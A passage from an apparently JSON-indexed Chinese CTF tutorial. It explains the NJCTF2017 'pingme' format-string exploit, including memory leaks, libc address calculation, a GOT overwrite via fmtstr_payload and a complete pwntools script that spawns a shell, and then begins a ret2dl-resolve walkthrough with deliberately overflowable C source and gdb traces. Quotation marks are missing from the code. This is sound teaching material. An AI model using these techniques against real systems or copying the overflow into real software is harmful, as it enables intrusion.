\u548c\u524d\u9762\u6709\u70b9\u4e0d\u540c\uff0c\u5b83\u628a\u5730\u5740\u653e\u5728\u4e86\u540e\u9762\uff0c\u662f\u4e3a\u4e86\u9632\u6b62 printf \u7684  %s  \u88ab  \\x00  \u622a\u65ad\uff1a payload   =   %9$s.AAA   +   p32 ( start_addr )  \n\u53e6\u5916  .AAA \uff0c\u662f\u4f5c\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u6211\u4eec\u9700\u8981\u7684\u5185\u5b58\u5728  .AAA  \u7684\u524d\u9762\uff0c\u6700\u540e\uff0c\u504f\u79fb\u7531 7 \u53d8\u4e3a 9\u3002  \u5728\u6ca1\u6709\u5f00\u542f PIE \u7684\u60c5\u51b5\u4e0b\uff0c32 \u4f4d\u7a0b\u5e8f\u4ece\u5730\u5740  0x8048000  \u5f00\u59cb\uff0c0x1000 \u7684\u5927\u5c0f\u5c31\u8db3\u591f\u4e86\u3002\u5728\u5bf9\u5185\u5b58  \\x00  \u8fdb\u884c leak \u65f6\uff0c\u6570\u636e\u957f\u5ea6\u4e3a\u96f6\uff0c\u76f4\u63a5\u7ed9\u5b83\u8d4b\u503c\u5c31\u53ef\u4ee5\u4e86\u3002  \u4e8e\u662f\u5c31\u6210\u4e86\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u65e0 libc \u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5728 r2 \u4e2d\u67e5\u8be2 printf \u7684 got \u5730\u5740\uff1a [0x08048490]  is~printf\nvaddr=0x08048400 paddr=0x00000400 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf                                                                                        \n[0x08048490]  pd 3 @ 0x08048400\n        :   ;-- imp.printf:                                                                                                                                                           \n        :   0x08048400      ff2574990408   jmp dword [reloc.printf_116] ; 0x8049974                                                                                                   \n        :   0x08048406      6808000000     push 8                      ; 8                                                                                                            \n        `=  0x0804840b      e9d0ffffff     jmp 0x80483e0 \n\u5730\u5740\u4e3a  0x8049974 \u3002", 
            "title": "dump file"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#printf-address-system-address", 
            "text": "\u63a5\u4e0b\u6765\u901a\u8fc7 printf@got \u6cc4\u9732\u51fa printf \u7684\u5730\u5740\uff0c\u8fdb\u884c\u5230\u8fd9\u513f\uff0c\u5c31\u6709\u4e24\u79cd\u65b9\u5f0f\u8981\u8003\u8651\u4e86\uff0c\u5373\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u62ff\u5230 libc\uff0c\u5982\u679c\u80fd\uff0c\u5c31\u5f88\u7b80\u5355\u4e86\u3002\u5982\u679c\u4e0d\u80fd\uff0c\u5c31\u9700\u8981\u4f7f\u7528 DynELF \u8fdb\u884c\u65e0 libc \u7684\u5229\u7528\u3002  \u5148\u8bf4\u7b2c\u4e00\u79cd\uff1a def   get_printf_addr (): \n     p   =   remote ( 127.0.0.1 ,   10001 ) \n     p . recvline () \n     payload   =   %9$s.AAA   +   p32 ( printf_got ) \n     p . sendline ( payload ) \n     data   =   p . recvuntil ( .AAA )[: 4 ] \n     log . info ( printf address:  %s   %   data . encode ( hex )) \n     return   data  printf_addr   =   get_printf_addr ()   [*] printf address: 70e6e0f7 \n\u6240\u4ee5 printf \u7684\u5730\u5740\u662f  0xf7e0e670 \uff08\u5c0f\u7aef\u5e8f\uff09\uff0c\u4f7f\u7528 libc-database \u67e5\u8be2\u5f97\u5230 libc.so\uff0c\u7136\u540e\u53ef\u4ee5\u5f97\u5230 printf \u548c system \u7684\u76f8\u5bf9\u4f4d\u7f6e\u3002 $ ./find printf 670\nubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)\n/usr/lib32/libc-2.26.so (id local-292a64d65098446389a47cdacdf5781255a95098)\n$ ./dump local-292a64d65098446389a47cdacdf5781255a95098 printf system\noffset_printf = 0x00051670\noffset_system = 0x0003cc50 \n\u7136\u540e\u8ba1\u7b97\u5f97\u5230 printf \u7684\u5730\u5740\uff1a printf_addr   =   0xf7e0e670  offset_printf   =   0x00051670  offset_system   =   0x0003cc50  system_addr   =   printf_addr   -   ( offset_printf   -   offset_system )   \u7b2c\u4e8c\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 DynELF \u6a21\u5757\u6765\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff1a def   leak ( addr ): \n     p   =   remote ( 127.0.0.1 ,   10001 ) \n     p . recvline () \n     payload   =   %9$s.AAA   +   p32 ( addr ) \n     p . sendline ( payload ) \n     data   =   p . recvuntil ( .AAA )[: - 4 ]   +   \\x00 \n     log . info ( leaking: 0x %x  --   %s   %   ( addr ,   data . encode ( hex ))) \n     p . close () \n     return   data  data   =   DynELF ( leak ,   0x08048490 )       # Entry point address  system_addr   =   data . lookup ( system ,   libc )  printf_addr   =   data . lookup ( printf ,   libc )  log . info ( system address: 0x %x   %   system_addr )  log . info ( printf address: 0x %x   %   printf_addr )   [*] system address: 0xf7df9c50\n[*] printf address: 0xf7e0e670 \nDynELF \u4e0d\u8981\u6c42\u6211\u4eec\u62ff\u5230 libc.so\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u67e5\u8be2\u4e0d\u5230 libc.so \u7684\u7248\u672c\u4fe1\u606f\uff0c\u8be5\u6a21\u5757\u5c31\u80fd\u53d1\u6325\u5b83\u6700\u5927\u7684\u4f5c\u7528\u3002", 
            "title": "printf address &amp; system address"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#attack", 
            "text": "\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u5957\u8def\uff0c\u6211\u4eec\u901a\u8fc7\u4efb\u610f\u5199\u5c06 printf@got \u6307\u5411\u7684\u5185\u5b58\u8986\u76d6\u4e3a system \u7684\u5730\u5740\uff0c\u7136\u540e\u53d1\u9001\u5b57\u7b26\u4e32  /bin/sh \uff0c\u5c31\u53ef\u4ee5\u5728\u8c03\u7528  printf( /bin/sh )  \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528  system( /bin/sh ) \u3002  \u7ec8\u6781 payload \u5982\u4e0b\uff0c\u4f7f\u7528  fmtstr_payload  \u51fd\u6570\u6765\u81ea\u52a8\u6784\u9020\uff0c\u5c06\uff1a payload   =   fmtstr_payload ( 7 ,   { printf_got :   system_addr })  p   =   remote ( 127.0.0.1 ,   10001 )  p . recvline ()  p . sendline ( payload )  p . recv ()  p . sendline ( /bin/sh )  p . interactive ()  \n\u867d\u8bf4\u6709\u8fd9\u6837\u7684\u81ea\u52a8\u5316\u51fd\u6570\u5f88\u65b9\u4fbf\uff0c\u57fa\u672c\u7684\u624b\u5de5\u6784\u9020\u8fd8\u662f\u8981\u61c2\u7684\uff0c\u770b\u4e00\u4e0b\u751f\u6210\u7684 payload \u957f\u4ec0\u4e48\u6837\u5b50\uff1a [DEBUG] Sent 0x3a bytes:\n    00000000  74 99 04 08  75 99 04 08  76 99 04 08  77 99 04 08  \u2502t\u00b7\u00b7\u00b7\u2502u\u00b7\u00b7\u00b7\u2502v\u00b7\u00b7\u00b7\u2502w\u00b7\u00b7\u00b7\u2502\n    00000010  25 36 34 63  25 37 24 68  68 6e 25 37  36 63 25 38  \u2502%64c\u2502%7$h\u2502hn%7\u25026c%8\u2502\n    00000020  24 68 68 6e  25 36 37 63  25 39 24 68  68 6e 25 32  \u2502$hhn\u2502%67c\u2502%9$h\u2502hn%2\u2502\n    00000030  34 63 25 31  30 24 68 68  6e 0a                     \u25024c%1\u25020$hh\u2502n\u00b7\u2502\n    0000003a \n\u5f00\u5934\u662f printf@got \u5730\u5740\uff0c\u56db\u4e2a\u5b57\u8282\u5206\u522b\u4f4d\u4e8e\uff1a 0x08049974\n0x08049975\n0x08049976\n0x08049977 \n\u7136\u540e\u662f\u683c\u5f0f\u5b57\u7b26\u4e32  %64c%7$hhn%76c%8hhn%67c%9$hhn%24c%10$hhn \uff1a 16  + 64 = 80  = 0x50\n80  + 76 = 156 = 0x9c\n156 + 67 = 223 = 0xdf\n233 + 24 = 247 = 0xf7 \n\u5c31\u8fd9\u6837\u5c06 system \u7684\u5730\u5740\u5199\u5165\u4e86\u5185\u5b58\u3002  Bingo!!! $ python2 exp.py\n[+] Opening connection to 127.0.0.2 on port 10001: Done\n[*] Switching to interactive mode\n$ whoami\nfirmy", 
            "title": "attack"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  # context.log_level =  debug  def   exec_fmt ( payload ): \n     p . sendline ( payload ) \n     info   =   p . recv () \n     return   info  # p = remote( 127.0.0.1 ,  10001 )  # p.recvline()  # auto = FmtStr(exec_fmt)  # offset = auto.offset  # p.close()  def   dump_memory ( start_addr ,   end_addr ): \n     result   =   \n     while   start_addr     end_addr : \n         p   =   remote ( 127.0.0.1 ,   10001 ) \n         p . recvline () \n         # print result.encode( hex ) \n         payload   =   %9$s.AAA   +   p32 ( start_addr ) \n         p . sendline ( payload ) \n         data   =   p . recvuntil ( .AAA )[: - 4 ] \n         if   data   ==   : \n             data   =   \\x00 \n         log . info ( leaking: 0x %x  --   %s   %   ( start_addr ,   data . encode ( hex ))) \n         result   +=   data \n         start_addr   +=   len ( data ) \n         p . close () \n     return   result  # start_addr = 0x8048000  # end_addr   = 0x8049000  # code_bin = dump_memory(start_addr, end_addr)  # with open( code.bin ,  wb ) as f:  #     f.write(code_bin)  #     f.close()  printf_got   =   0x8049974  ## method 1  def   get_printf_addr (): \n     p   =   remote ( 127.0.0.1 ,   10001 ) \n     p . recvline () \n     payload   =   %9$s.AAA   +   p32 ( printf_got ) \n     p . sendline ( payload ) \n     data   =   p . recvuntil ( .AAA )[: 4 ] \n     log . info ( printf address:  %s   %   data . encode ( hex )) \n     return   data  # printf_addr = get_printf_addr()  printf_addr   =   0xf7e0e670  offset_printf   =   0x00051670  offset_system   =   0x0003cc50  system_addr   =   printf_addr   -   ( offset_printf   -   offset_system )  ## method 2  def   leak ( addr ): \n     p   =   remote ( 127.0.0.1 ,   10001 ) \n     p . recvline () \n     payload   =   %9$s.AAA   +   p32 ( addr ) \n     p . sendline ( payload ) \n     data   =   p . recvuntil ( .AAA )[: - 4 ]   +   \\x00 \n     log . info ( leaking: 0x %x  --   %s   %   ( addr ,   data . encode ( hex ))) \n     p . close () \n     return   data  # data = DynELF(leak, 0x08048490)     # Entry point address  # system_addr = data.lookup( system ,  libc )  # printf_addr = data.lookup( printf ,  libc )  # log.info( system address: 0x%x  % system_addr)  # log.info( printf address: 0x%x  % printf_addr)  ## get shell  payload   =   fmtstr_payload ( 7 ,   { printf_got :   system_addr })  p   =   remote ( 127.0.1.1 ,   10001 )  p . recvline ()  p . sendline ( payload )  p . recv ()  p . sendline ( /bin/sh )  p . interactive ()", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#_3", 
            "text": "Linux\u7cfb\u7edf\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5229\u7528\u7814\u7a76  33C3 CTF 2016 -- ESPR", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/", 
            "text": "\u9898\u76ee\u590d\u73b0\n\n\nret2dl-resolve \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790\n\n\nExploit\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n\u51fa\u9898\u4eba\u5728\u535a\u5ba2\u91cc\u8d34\u51fa\u4e86\u6e90\u7801\uff0c\u5982\u4e0b\uff1a\n\n#include\n \nunistd.h\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstring.h\n\n\n\nvoid\n \nvuln\n()\n\n\n{\n\n    \nchar\n \nbuf\n[\n100\n];\n\n    \nsetbuf\n(\nstdin\n,\n \nbuf\n);\n\n    \nread\n(\n0\n,\n \nbuf\n,\n \n256\n);\n\n\n}\n\n\nint\n \nmain\n()\n\n\n{\n\n    \nchar\n \nbuf\n[\n100\n]\n \n=\n \nWelcome to XDCTF2015~!\n\\n\n;\n\n\n    \nsetbuf\n(\nstdout\n,\n \nbuf\n);\n\n    \nwrite\n(\n1\n,\n \nbuf\n,\n \nstrlen\n(\nbuf\n));\n\n    \nvuln\n();\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n\n\u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u7f16\u8bd1\uff1a\n\n$ gcc -m32 -fno-stack-protector -no-pie -s pwn200.c\n\n\nchecksec \u5982\u4e0b\uff1a\n\n$ checksec -f a.out\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No     0               1       a.out\n\n\n\u5728\u5f00\u542f ASLR \u7684\u60c5\u51b5\u4e0b\u628a\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\uff1a\n\n$ socat tcp4-listen:10001,reuseaddr,fork exec:./a.out \n\n\n\n\u8fd9\u9898\u63d0\u4f9b\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6\u800c\u6ca1\u6709\u63d0\u4f9b libc.so\uff0c\u800c\u4e14\u4e5f\u9ed8\u8ba4\u627e\u4e0d\u5230\uff0c\u5728\u7ae0\u8282 4.8 \u4e2d\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u89e3\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u8bb2\u89e3\u53e6\u4e00\u79cd\u3002\n\n\nret2dl-resolve \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790\n\n\n\u8fd9\u79cd\u5229\u7528\u7684\u6280\u672f\u662f\u5728 2015 \u5e74\u7684\u8bba\u6587 \u201cHow the ELF Ruined Christmas\u201d \u4e2d\u63d0\u51fa\u7684\uff0c\u8bba\u6587\u5730\u5740\u5728\u53c2\u8003\u8d44\u6599\u4e2d\u3002ret2dl-resolve \u4e0d\u9700\u8981\u4fe1\u606f\u6cc4\u9732\uff0c\u800c\u662f\u901a\u8fc7\u52a8\u6001\u88c5\u8f7d\u5668\u6765\u76f4\u63a5\u6807\u8bc6\u5173\u952e\u51fd\u6570\u7684\u4f4d\u7f6e\u5e76\u8c03\u7528\u5b83\u4eec\u3002\u5b83\u53ef\u4ee5\u7ed5\u8fc7\u591a\u79cd\u5b89\u5168\u7f13\u89e3\u63aa\u65bd\uff0c\u5305\u62ec\u4e13\u95e8\u4e3a\u4fdd\u62a4 ELF \u6570\u636e\u7ed3\u6784\u4e0d\u88ab\u7834\u574f\u800c\u8bbe\u8ba1\u7684 RELRO\u3002\u800c\u5728 ctf \u4e2d\uff0c\u6211\u4eec\u4e5f\u80fd\u770b\u5230\u5b83\u7684\u8eab\u5f71\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u4ed8\u65e0\u6cd5\u83b7\u5f97\u76ee\u6807\u7cfb\u7edf libc.so \u7684\u60c5\u51b5\u3002\n\n\n\u5ef6\u8fdf\u7ed1\u5b9a\n\n\n\u5173\u4e8e\u52a8\u6001\u94fe\u63a5\u6211\u4eec\u5728\u7ae0\u8282 1.5.6 \u4e2d\u5df2\u7ecf\u8bb2\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5c31\u91cd\u70b9\u8bb2\u4e00\u4e0b\u52a8\u6001\u89e3\u6790\u7684\u8fc7\u7a0b\u3002\u6211\u4eec\u77e5\u9053\uff0c\u5728\u52a8\u6001\u94fe\u63a5\u4e2d\uff0c\u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542f Full RELRO \u4fdd\u62a4\uff0c\u5219\u5b58\u5728\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u8fc7\u7a0b\uff0c\u5373\u5e93\u51fd\u6570\u5728\u7b2c\u4e00\u6b21\u88ab\u8c03\u7528\u65f6\u624d\u5c06\u51fd\u6570\u7684\u771f\u6b63\u5730\u5740\u586b\u5165 GOT \u8868\u4ee5\u5b8c\u6210\u7ed1\u5b9a\u3002\n\n\n\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u7684\u7a0b\u5e8f\u5934\u8868\u4e2d\u4f1a\u5305\u542b\u7c7b\u578b\u4e3a \nPT_DYNAMIC\n \u7684\u6bb5\uff0c\u5b83\u5305\u542b\u4e86 \n.dynamic\n \u6bb5\uff0c\u7ed3\u6784\u5982\u4e0b\uff1a\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf32_Sword\n   \nd_tag\n;\n          \n/* Dynamic entry type */\n\n  \nunion\n\n    \n{\n\n      \nElf32_Word\n \nd_val\n;\n         \n/* Integer value */\n\n      \nElf32_Addr\n \nd_ptr\n;\n         \n/* Address value */\n\n    \n}\n \nd_un\n;\n\n\n}\n \nElf32_Dyn\n;\n\n\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf64_Sxword\n  \nd_tag\n;\n          \n/* Dynamic entry type */\n\n  \nunion\n\n    \n{\n\n      \nElf64_Xword\n \nd_val\n;\n        \n/* Integer value */\n\n      \nElf64_Addr\n \nd_ptr\n;\n         \n/* Address value */\n\n    \n}\n \nd_un\n;\n\n\n}\n \nElf64_Dyn\n;\n\n\n\n\u4e00\u4e2a \nElf_Dyn\n \u662f\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u5176\u4e2d \nd_tag\n \u662f\u952e\uff0c\nd_value\n \u662f\u503c\u3002\u5176\u4e2d\u6709\u4e2a\u4f8b\u5916\u7684\u6761\u76ee\u662f \nDT_DEBUG\n\uff0c\u5b83\u4fdd\u5b58\u4e86\u52a8\u6001\u88c5\u8f7d\u5668\u5185\u90e8\u6570\u636e\u7ed3\u6784\u7684\u6307\u9488\u3002\n\n\n\u6bb5\u8868\u7ed3\u6784\u5982\u4e0b\uff1a\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf32_Word\n    \nsh_name\n;\n        \n/* Section name (string tbl index) */\n\n  \nElf32_Word\n    \nsh_type\n;\n        \n/* Section type */\n\n  \nElf32_Word\n    \nsh_flags\n;\n       \n/* Section flags */\n\n  \nElf32_Addr\n    \nsh_addr\n;\n        \n/* Section virtual addr at execution */\n\n  \nElf32_Off\n \nsh_offset\n;\n      \n/* Section file offset */\n\n  \nElf32_Word\n    \nsh_size\n;\n        \n/* Section size in bytes */\n\n  \nElf32_Word\n    \nsh_link\n;\n        \n/* Link to another section */\n\n  \nElf32_Word\n    \nsh_info\n;\n        \n/* Additional section information */\n\n  \nElf32_Word\n    \nsh_addralign\n;\n       \n/* Section alignment */\n\n  \nElf32_Word\n    \nsh_entsize\n;\n     \n/* Entry size if section holds table */\n\n\n}\n \nElf32_Shdr\n;\n\n\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf64_Word\n    \nsh_name\n;\n        \n/* Section name (string tbl index) */\n\n  \nElf64_Word\n    \nsh_type\n;\n        \n/* Section type */\n\n  \nElf64_Xword\n   \nsh_flags\n;\n       \n/* Section flags */\n\n  \nElf64_Addr\n    \nsh_addr\n;\n        \n/* Section virtual addr at execution */\n\n  \nElf64_Off\n \nsh_offset\n;\n      \n/* Section file offset */\n\n  \nElf64_Xword\n   \nsh_size\n;\n        \n/* Section size in bytes */\n\n  \nElf64_Word\n    \nsh_link\n;\n        \n/* Link to another section */\n\n  \nElf64_Word\n    \nsh_info\n;\n        \n/* Additional section information */\n\n  \nElf64_Xword\n   \nsh_addralign\n;\n       \n/* Section alignment */\n\n  \nElf64_Xword\n   \nsh_entsize\n;\n     \n/* Entry size if section holds table */\n\n\n}\n \nElf64_Shdr\n;\n\n\n\n\n\u5177\u4f53\u6765\u770b\uff0c\u9996\u5148\u5728 write@plt \u5730\u5740\u5904\u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u8fd0\u884c\uff1a\n\ngdb-peda$ p write\n$1 = {\ntext variable, no debug info\n} 0x8048430 \nwrite@plt\n\ngdb-peda$ b *0x8048430\nBreakpoint 1 at 0x8048430\ngdb-peda$ r\nStarting program: /home/firmy/Desktop/RE4B/200/a.out\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd59c --\n 0x804861b (add    esp,0x10)\nEIP: 0x8048430 (\nwrite@plt\n:    jmp    DWORD PTR ds:0x804a01c)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048420 \n__libc_start_main@plt\n:   jmp    DWORD PTR ds:0x804a018\n   0x8048426 \n__libc_start_main@plt+6\n: push   0x18\n   0x804842b \n__libc_start_main@plt+11\n:        jmp    0x80483e0\n=\n 0x8048430 \nwrite@plt\n:       jmp    DWORD PTR ds:0x804a01c\n | 0x8048436 \nwrite@plt+6\n:     push   0x20\n | 0x804843b \nwrite@plt+11\n:    jmp    0x80483e0\n | 0x8048440:   jmp    DWORD PTR ds:0x8049ff0\n | 0x8048446:   xchg   ax,ax\n |-\n   0x8048436 \nwrite@plt+6\n: push   0x20\n       0x804843b \nwrite@plt+11\n:        jmp    0x80483e0\n       0x8048440:       jmp    DWORD PTR ds:0x8049ff0\n       0x8048446:       xchg   ax,ax\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0004| 0xffffd5a0 --\n 0x1\n0008| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0012| 0xffffd5a8 --\n 0x17\n0016| 0xffffd5ac --\n 0x80485a4 (add    ebx,0x1a5c)\n0020| 0xffffd5b0 --\n 0xffffd5ea --\n 0x0\n0024| 0xffffd5b4 --\n 0xf7ffca64 --\n 0x6\n0028| 0xffffd5b8 --\n 0xf7ffca68 --\n 0x3c (\n)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x08048430 in write@plt ()\ngdb-peda$ x/w 0x804a01c\n0x804a01c:      0x08048436\n\n\n\u7531\u4e8e\u662f\u7b2c\u4e00\u6b21\u8fd0\u884c\uff0c\u5c1a\u672a\u8fdb\u884c\u7ed1\u5b9a\uff0c\n0x804a01c\n \u5730\u5740\u5904\u4fdd\u5b58\u7684\u662f write@plt+6 \u7684\u5730\u5740 \n0x8048436\n\uff0c\u5373\u8df3\u8f6c\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\u3002\n\n\n\u5c06 \n0x20\n \u538b\u5165\u6808\u4e2d\uff0c\u8fd9\u4e2a\u6570\u5b57\u662f\u5bfc\u5165\u51fd\u6570\u7684\u6807\u8bc6\uff0c\u5373\u4e00\u4e2a ELF_Rel \u5728 \n.rel.plt\n \u4e2d\u7684\u504f\u79fb\uff1a\n\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd59c --\n 0x804861b (add    esp,0x10)\nEIP: 0x8048436 (\nwrite@plt+6\n:  push   0x20)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048426 \n__libc_start_main@plt+6\n: push   0x18\n   0x804842b \n__libc_start_main@plt+11\n:        jmp    0x80483e0\n   0x8048430 \nwrite@plt\n:       jmp    DWORD PTR ds:0x804a01c\n=\n 0x8048436 \nwrite@plt+6\n:     push   0x20\n   0x804843b \nwrite@plt+11\n:    jmp    0x80483e0\n   0x8048440:   jmp    DWORD PTR ds:0x8049ff0\n   0x8048446:   xchg   ax,ax\n   0x8048448:   add    BYTE PTR [eax],al\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0004| 0xffffd5a0 --\n 0x1\n0008| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0012| 0xffffd5a8 --\n 0x17\n0016| 0xffffd5ac --\n 0x80485a4 (add    ebx,0x1a5c)\n0020| 0xffffd5b0 --\n 0xffffd5ea --\n 0x0\n0024| 0xffffd5b4 --\n 0xf7ffca64 --\n 0x6\n0028| 0xffffd5b8 --\n 0xf7ffca68 --\n 0x3c (\n)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x08048436 in write@plt ()\n\n\n\n\u7136\u540e\u8df3\u8f6c\u5230 \n0x80483e0\n\uff0c\u8be5\u5730\u5740\u662f \n.plt\n \u6bb5\u7684\u5f00\u5934\uff0c\u5373 PLT[0]\uff1a\n\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd598 --\n 0x20 (\n \n)\nEIP: 0x804843b (\nwrite@plt+11\n: jmp    0x80483e0)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x804842b \n__libc_start_main@plt+11\n:        jmp    0x80483e0\n   0x8048430 \nwrite@plt\n:       jmp    DWORD PTR ds:0x804a01c\n   0x8048436 \nwrite@plt+6\n:     push   0x20\n=\n 0x804843b \nwrite@plt+11\n:    jmp    0x80483e0\n | 0x8048440:   jmp    DWORD PTR ds:0x8049ff0\n | 0x8048446:   xchg   ax,ax\n | 0x8048448:   add    BYTE PTR [eax],al\n | 0x804844a:   add    BYTE PTR [eax],al\n |-\n   0x80483e0:       push   DWORD PTR ds:0x804a004\n       0x80483e6:       jmp    DWORD PTR ds:0x804a008\n       0x80483ec:       add    BYTE PTR [eax],al\n       0x80483ee:       add    BYTE PTR [eax],al\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd598 --\n 0x20 (\n \n)\n0004| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0008| 0xffffd5a0 --\n 0x1\n0012| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0016| 0xffffd5a8 --\n 0x17\n0020| 0xffffd5ac --\n 0x80485a4 (add    ebx,0x1a5c)\n0024| 0xffffd5b0 --\n 0xffffd5ea --\n 0x0\n0028| 0xffffd5b4 --\n 0xf7ffca64 --\n 0x6\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0804843b in write@plt ()\n\n\n\n$ readelf -S a.out | grep 80483e0\n  [12] .plt              PROGBITS        080483e0 0003e0 000060 04  AX  0   0 16\n\n\n\n\u63a5\u4e0b\u6765\u5c31\u8fdb\u5165 PLT[0] \u5904\u7684\u4ee3\u7801\uff1a\n\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd598 --\n 0x20 (\n \n)\nEIP: 0x80483e0 (push   DWORD PTR ds:0x804a004)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=\n 0x80483e0:   push   DWORD PTR ds:0x804a004\n   0x80483e6:   jmp    DWORD PTR ds:0x804a008\n   0x80483ec:   add    BYTE PTR [eax],al\n   0x80483ee:   add    BYTE PTR [eax],al\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd598 --\n 0x20 (\n \n)\n0004| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0008| 0xffffd5a0 --\n 0x1\n0012| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0016| 0xffffd5a8 --\n 0x17\n0020| 0xffffd5ac --\n 0x80485a4 (add    ebx,0x1a5c)\n0024| 0xffffd5b0 --\n 0xffffd5ea --\n 0x0\n0028| 0xffffd5b4 --\n 0xf7ffca64 --\n 0x6\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080483e0 in ?? ()\ngdb-peda$ x/w 0x804a004\n0x804a004:      0xf7ffd900\ngdb-peda$ x/w 0x804a008\n0x804a008:      0xf7fec370\n\n\n\n$ readelf -S a.out | grep .got.plt\n  [23] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4\n\n\n\u770b\u4e00\u4e0b \n.got.plt\n \u6bb5\uff0c\u6240\u4ee5 \n0x804a004\n \u548c \n0x804a008\n \u5206\u522b\u662f GOT[1] \u548c GOT[2]\u3002\u7ee7\u7eed\u8c03\u8bd5\uff1a\n\n\ngdb-peda$ 